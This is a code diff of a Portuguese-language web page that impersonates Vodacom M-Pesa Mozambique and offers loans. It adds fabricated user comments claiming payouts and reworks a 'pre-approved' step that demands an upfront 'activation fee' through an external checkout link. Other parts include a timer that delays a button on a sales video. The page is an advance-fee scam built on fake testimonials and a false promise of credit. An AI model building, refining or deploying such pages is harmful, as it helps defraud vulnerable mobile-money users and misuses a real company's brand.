+                <div class="border-t border-gray-100 pt-4 space-y-3">
+                    <div class="flex items-center justify-between text-xs text-gray-600 pb-2 border-b border-gray-100">
+                        <span class="font-bold text-gray-800 text-sm">Comentários (5)</span>
                         <span class="text-gray-400 cursor-pointer">Mais relevantes ▾</span>
                     </div>
 
                     <!-- Comment List -->
-                    <div class="space-y-4 text-xs">
-                        <!-- Comment 1 -->
-                        <div class="space-y-1">
-                            <div class="flex items-start space-x-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">CM</div>
-                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
-                                    <span class="font-bold text-gray-900 block mb-0.5">Carlos Mabunda</span>
-                                    <p class="text-gray-700">Mano, recebi mesmo os 5,000.00 MT no M-Pesa 🙏🙏 nem acreditei quando vi a notificação. Obrigado Vodacom!</p>
-                                </div>
-                            </div>
-                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
-                                <span class="cursor-pointer text-vodared">Gostar</span>
-                                <span class="cursor-pointer">Responder</span>
-                                <span class="text-gray-400">12 min · 342</span>
-                            </div>
-
-                            <!-- Reply 1.1 -->
-                            <div class="pl-8 pt-2 space-y-1">
-                                <div class="flex items-start space-x-2">
-                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">SM</div>
-                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
-                                        <span class="font-bold text-gray-900 block mb-0.5">Sónia Macuácua</span>
-                                        <p class="text-gray-700">Sério mesmo?? to a tentar agora 😱</p>
-                                    </div>
-                                </div>
-                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
-                                    <span class="cursor-pointer text-vodared">Gostar</span>
-                                    <span class="cursor-pointer">Responder</span>
-                                    <span class="text-gray-400">8 min</span>
-                                </div>
-                            </div>
-
-                            <!-- Reply 1.2 -->
-                            <div class="pl-8 pt-1 space-y-1">
-                                <div class="flex items-start space-x-2">
-                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">CM</div>
-                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
-                                        <span class="font-bold text-gray-900 block mb-0.5">Carlos Mabunda</span>
-                                        <p class="text-gray-700">Sim mana, só seguir o video todo até ao fim que cai 👍🏾</p>
-                                    </div>
-                                </div>
-                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
-                                    <span class="cursor-pointer text-vodared">Gostar</span>
-                                    <span class="cursor-pointer">Responder</span>
-                                    <span class="text-gray-400">5 min</span>
-                                </div>
-                            </div>
-
-                            <!-- Reply 1.3 -->
-                            <div class="pl-8 pt-1 space-y-1">
-                                <div class="flex items-start space-x-2">
-                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">SM</div>
-                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
-                                        <span class="font-bold text-gray-900 block mb-0.5">Sónia Macuácua</span>
-                                        <p class="text-gray-700">Caiu agora mesmo!! obg 🥺❤️</p>
-                                    </div>
-                                </div>
-                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
-                                    <span class="cursor-pointer text-vodared">Gostar</span>
-                                    <span class="cursor-pointer">Responder</span>
-                                    <span class="text-gray-400">2 min</span>
-                                </div>
-                            </div>
+                    <div class="space-y-3.5 text-xs">
+                        <div class="bg-gray-50 p-3 rounded-2xl border border-gray-100/80 space-y-1">
+                            <div class="flex justify-between items-center"><span class="font-bold text-gray-900">Carlos Mabunda</span> <span class="text-[10px] text-gray-400">12 min</span></div>
+                            <p class="text-gray-700">Mano, recebi mesmo os 5,000.00 MT no M-Pesa 🙏🙏 nem acreditei quando vi a notificação. Obrigado Vodacom!</p>
                         </div>
-
-                        <!-- Comment 2 -->
-                        <div class="space-y-1">
-                            <div class="flex items-start space-x-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">SM</div>
-                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
-                                    <span class="font-bold text-gray-900 block mb-0.5">Sónia Macuácua</span>
-                                    <p class="text-gray-700">Já é a 2a vez q participo nestes programas da Vodacom... sempre pagam certinho. Moçambique a evoluir 🇲🇿💚</p>
-                                </div>
-                            </div>
-                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
-                                <span class="cursor-pointer text-vodared">Gostar</span>
-                                <span class="cursor-pointer">Responder</span>
-                                <span class="text-gray-400">27 min · 189</span>
-                            </div>
+                        <div class="bg-gray-50 p-3 rounded-2xl border border-gray-100/80 space-y-1">
+                            <div class="flex justify-between items-center"><span class="font-bold text-gray-900">Sónia Macuácua</span> <span class="text-[10px] text-gray-400">27 min</span></div>
+                            <p class="text-gray-700">Já é a 2a vez q participo nestes programas... sempre pagam certinho. Moçambique a evoluir 🇲🇿💚</p>
                         </div>
-
-                        <!-- Comment 3 -->
-                        <div class="space-y-1">
-                            <div class="flex items-start space-x-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">HC</div>
-                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
-                                    <span class="font-bold text-gray-900 block mb-0.5">Hélder Cossa</span>
-                                    <p class="text-gray-700">pensei q era falso mas caiu mesmo o saldo no meu m-pesa 😳 valeu a pena ver o video todo, recomendo ✅</p>
-                                </div>
-                            </div>
-                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
-                                <span class="cursor-pointer text-vodared">Gostar</span>
-                                <span class="cursor-pointer">Responder</span>
-                                <span class="text-gray-400">41 min · 127</span>
-                            </div>
+                        <div class="bg-gray-50 p-3 rounded-2xl border border-gray-100/80 space-y-1">
+                            <div class="flex justify-between items-center"><span class="font-bold text-gray-900">Hélder Cossa</span> <span class="text-[10px] text-gray-400">41 min</span></div>
+                            <p class="text-gray-700">pensei q era falso mas caiu mesmo o saldo no meu m-pesa 😳 valeu a pena ver o video todo, recomendo ✅</p>
                         </div>
-
-                        <!-- Comment 4 -->
-                        <div class="space-y-1">
-                            <div class="flex items-start space-x-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">LM</div>
-                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
-                                    <span class="font-bold text-gray-900 block mb-0.5">Lúcia Mondlane</span>
-                                    <p class="text-gray-700">Recebi tudo direitinho, vou usar pra pagar a escola dos miudos 😭🙌🏾 que Deus abençoe quem criou esse programa</p>
-                                </div>
-                            </div>
-                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
-                                <span class="cursor-pointer text-vodared">Gostar</span>
-                                <span class="cursor-pointer">Responder</span>
-                                <span class="text-gray-400">2 h · 411</span>
-                            </div>
-
-                            <!-- Reply 4.1 -->
-                            <div class="pl-8 pt-2 space-y-1">
-                                <div class="flex items-start space-x-2">
-                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">HC</div>
-                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
-                                        <span class="font-bold text-gray-900 block mb-0.5">Hélder Cossa</span>
-                                        <p class="text-gray-700">amen mana 🙏🏾</p>
-                                    </div>
-                                </div>
-                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
-                                    <span class="cursor-pointer text-vodared">Gostar</span>
-                                    <span class="cursor-pointer">Responder</span>
-                                    <span class="text-gray-400">1 h</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <!-- Comment 5 -->
-                        <div class="space-y-1">
-                            <div class="flex items-start space-x-2">
-                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">FC</div>
-                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
-                                    <span class="font-bold text-gray-900 block mb-0.5">Felizarda Chissano</span>
-                                    <p class="text-gray-700">alguém me ajuda pf, fiz tudo mas ainda nao recebi 😢</p>
-                                </div>
-                            </div>
-                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
-                                <span class="cursor-pointer text-vodared">Gostar</span>
-                                <span class="cursor-pointer">Responder</span>
-                                <span class="text-gray-400">3 h · 12</span>
-                            </div>
-
-                            <!-- Reply 5.1 -->
-                            <div class="pl-8 pt-2 space-y-1">
-                                <div class="flex items-start space-x-2">
-                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">CM</div>
-                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
-                                        <span class="font-bold text-gray-900 block mb-0.5">Carlos Mabunda</span>
-                                        <p class="text-gray-700">Tem que ver o video até ao final mana, eu tbm achei q não ia funcionar</p>
-                                    </div>
-                                </div>
-                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
-                                    <span class="cursor-pointer text-vodared">Gostar</span>
-                                    <span class="cursor-pointer">Responder</span>
-                                    <span class="text-gray-400">2 h</span>
-                                </div>
-                            </div>
-
-                            <!-- Reply 5.2 -->
-                            <div class="pl-8 pt-1 space-y-1">
-                                <div class="flex items-start space-x-2">
-                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">FC</div>
-                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
-                                        <span class="font-bold text-gray-900 block mb-0.5">Felizarda Chissano</span>
-                                        <p class="text-gray-700">ahh ok deixa eu tentar de novo, obg 🙏</p>
-                                    </div>
-                                </div>
-                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
-                                    <span class="cursor-pointer text-vodared">Gostar</span>
-                                    <span class="cursor-pointer">Responder</span>
-                                    <span class="text-gray-400">2 h</span>
-                                </div>
-                            </div>
-                        </div>
-
                     </div>
                 </div>
-
             </div>
 
-            <!-- STEP 9: Pedido Pré-aprovado & Taxa de Ativação (Redesenhado de forma muito agradável) -->
-            <div id="step-9" class="step-content hidden p-6 space-y-5">
-                
-                <!-- Badge de Sucesso -->
+            <!-- STEP 9: Pedido Pré-aprovado & Taxa de Ativação (Super agradável e fluida) -->
+            <div id="step-9" class="step-content hidden p-7 space-y-5">
                 <div class="text-center">
-                    <div class="inline-flex items-center justify-center w-12 h-12 bg-emerald-100 text-mpesagreen rounded-full mb-2 shadow-sm">
+                    <div class="inline-flex items-center justify-center w-14 h-14 bg-emerald-100 text-mpesagreen rounded-full mb-3 shadow-sm text-xl font-bold">
                         ✓
                     </div>
-                    <span class="bg-emerald-50 text-mpesagreen text-[11px] font-bold px-3 py-1 rounded-full uppercase tracking-wider border border-emerald-200">Pedido pré-aprovado com sucesso</span>
-                    <h2 class="text-xl font-extrabold text-gray-900 mt-2">Falta apenas um passo para receber o seu dinheiro</h2>
-                    <p class="text-xs text-gray-600 mt-1 leading-relaxed">
+                    <span class="bg-emerald-50 text-mpesagreen text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider border border-emerald-200">Pré-aprovado com Sucesso</span>
+                    <h2 class="text-xl font-extrabold text-gray-900 mt-2.5">Falta apenas um passo para receber o seu dinheiro</h2>
+                    <p class="text-xs text-gray-600 mt-1.5 leading-relaxed">
                         Os seus dados foram validados e o seu empréstimo está reservado em segurança no sistema M-Pesa.
                     </p>
                 </div>
 
-                <!-- Cartão Principal de Explication -->
-                <div class="bg-gradient-to-br from-red-50 to-white border border-red-200 rounded-2xl p-5 shadow-sm space-y-3">
+                <!-- Cartão Informativo -->
+                <div class="bg-gradient-to-br from-red-50/70 to-white border border-red-200/80 rounded-2xl p-4 shadow-2xs space-y-2.5">
                     <h3 class="font-bold text-vodared text-sm flex items-center gap-1.5">
                         <span>💡</span> Porque é que a taxa é cobrada antes?
                     </h3>
                     <p class="text-xs text-gray-700 leading-relaxed">
-                        Sabemos que quem precisa de crédito não pode esperar. Por isso, a nossa taxa de ativação é <strong>única, acessível e não recorrente</strong>. Ela garante o registo oficial do contrato, a abertura da linha de crédito e a proteção do seguro — tudo <strong>sem exigir fiador, bancos ou bens em seu nome</strong>.
+                        Sabemos que quem precisa de crédito não pode esperar. Por isso, a nossa taxa de ativação é <strong>única, acessível e não recorrente</strong>. Ela garante o registo oficial do contrato, a abertura da linha de crédito e o seguro de proteção — tudo <strong>sem exigir fiador, bancos ou bens em seu nome</strong>.
                     </p>
                 </div>
 
-                <!-- Lista de Benefícios Claros -->
+                <!-- Lista de Benefícios -->
                 <div class="space-y-2.5 text-xs">
-                    <div class="flex items-start space-x-3 bg-gray-50 p-3 rounded-xl border border-gray-100">
-                        <span class="text-mpesagreen font-bold text-base leading-none">✔</span>
+                    <div class="flex items-start space-x-3 bg-gray-50/80 p-3 rounded-xl border border-gray-100">
+                        <span class="text-mpesagreen font-bold text-sm">✔</span>
                         <div>
-                            <strong class="text-gray-900 block">Validação de Identidade e Risco</strong>
-                            <span class="text-gray-500 text-[11px]">Garante a conformidade legal e o envio direto para o seu número.</span>
+                            <strong class="text-gray-900 block font-semibold">Validação de Identidade e Risco</strong>
+                            <span class="text-gray-500 text-[11px]">Garante a conformidade e envio imediato para o seu número.</span>
                         </div>
                     </div>
-                    <div class="flex items-start space-x-3 bg-gray-50 p-3 rounded-xl border border-gray-100">
-                        <span class="text-mpesagreen font-bold text-base leading-none">✔</span>
+                    <div class="flex items-start space-x-3 bg-gray-50/80 p-3 rounded-xl border border-gray-100">
+                        <span class="text-mpesagreen font-bold text-sm">✔</span>
                         <div>
-                            <strong class="text-gray-900 block">Abertura de Crédito M-Pesa</strong>
-                            <span class="text-gray-500 text-[11px]">Vinculação imediata do montante aprovado à sua conta móvel.</span>
-                        </div>
-                    </div>
-                    <div class="flex items-start space-x-3 bg-gray-50 p-3 rounded-xl border border-gray-100">
-                        <span class="text-mpesagreen font-bold text-base leading-none">✔</span>
-                        <div>
-                            <strong class="text-gray-900 block">Seguro de Proteção de Empréstimo</strong>
-                            <span class="text-gray-500 text-[11px]">Tranquilidade total caso ocorra qualquer imprevisto financeiro.</span>
+                            <strong class="text-gray-900 block font-semibold">Abertura de Crédito M-Pesa</strong>
+                            <span class="text-gray-500 text-[11px]">Vinculação direta do montante aprovado à sua carteira móvel.</span>
                         </div>
                     </div>
                 </div>
 
-                <!-- Destaques em Grid -->
+                <!-- Destaques -->
                 <div class="grid grid-cols-3 gap-2 text-center text-[11px]">
-                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
+                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200/80">
                         <span class="font-bold text-gray-900 block">Sem descontos</span>
                         <span class="text-gray-500">Valor integral</span>
                     </div>
-                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
+                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200/80">
                         <span class="font-bold text-gray-900 block">Taxa única</span>
                         <span class="text-gray-500">Sem surpresas</span>
                     </div>
-                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
+                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200/80">
                         <span class="font-bold text-gray-900 block">100% M-Pesa</span>
-                        <span class="text-gray-500">No seu telemóvel</span>
+                        <span class="text-gray-500">No telemóvel</span>
                     </div>
                 </div>
 
-                <!-- Botão de Checkout com Link Direto -->
-                <a href="https://payment-hub-hero.lovable.app/checkout/2aaacff6-35d0-420c-8347-beb5b658d3ef" target="_blank" class="block w-full text-center bg-mpesagreen hover:bg-emerald-700 text-white font-bold py-4 px-6 rounded-xl shadow-lg transition duration-200 text-sm cursor-pointer">
-                    Entendi, continuar para pagamento
+                <!-- Botão Direto para o Checkout -->
+                <a href="https://payment-hub-hero.lovable.app/checkout/2aaacff6-35d0-420c-8347-beb5b658d3ef" target="_blank" class="block w-full text-center bg-mpesagreen hover:bg-emerald-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-emerald-600/20 transition duration-200 text-sm cursor-pointer">
+                    Entendi, continuar para pagamento ➔
                 </a>
 
-                <p class="text-[10px] text-gray-400 text-center pb-2">Processo seguro e encriptado · Vodacom M-Pesa Moçambique</p>
+                <p class="text-[10px] text-gray-400 text-center">Processo seguro e encriptado · Vodacom M-Pesa Moçambique</p>
             </div>
 
         </div>
     </main>
 
     <!-- Footer -->
-    <footer class="text-center py-4 text-[11px] text-gray-500 border-t border-gray-100">
+    <footer class="text-center py-4 text-[11px] text-gray-500 border-t border-gray-100 bg-white/50">
         © 2026 Vodacom · Programa Empréstimos M-Pesa · Moçambique
     </footer>
 
@@ -594,7 +418,6 @@
                 document.getElementById('progress-bar').style.width = `${percent}%`;
             }
 
-            // Ativar temporizador de 1 minuto na VSL (Passo 8)
             if (currentStep === 8) {
                 startDelayedButtonTimer();
             }
@@ -648,7 +471,6 @@
             document.getElementById('input-valor').value = val;
         }
 
-        // Event Listeners
         document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('btn-comecar').addEventListener('click', nextStep);
             document.getElementById('btn-voltar').addEventListener('click', prevStep);
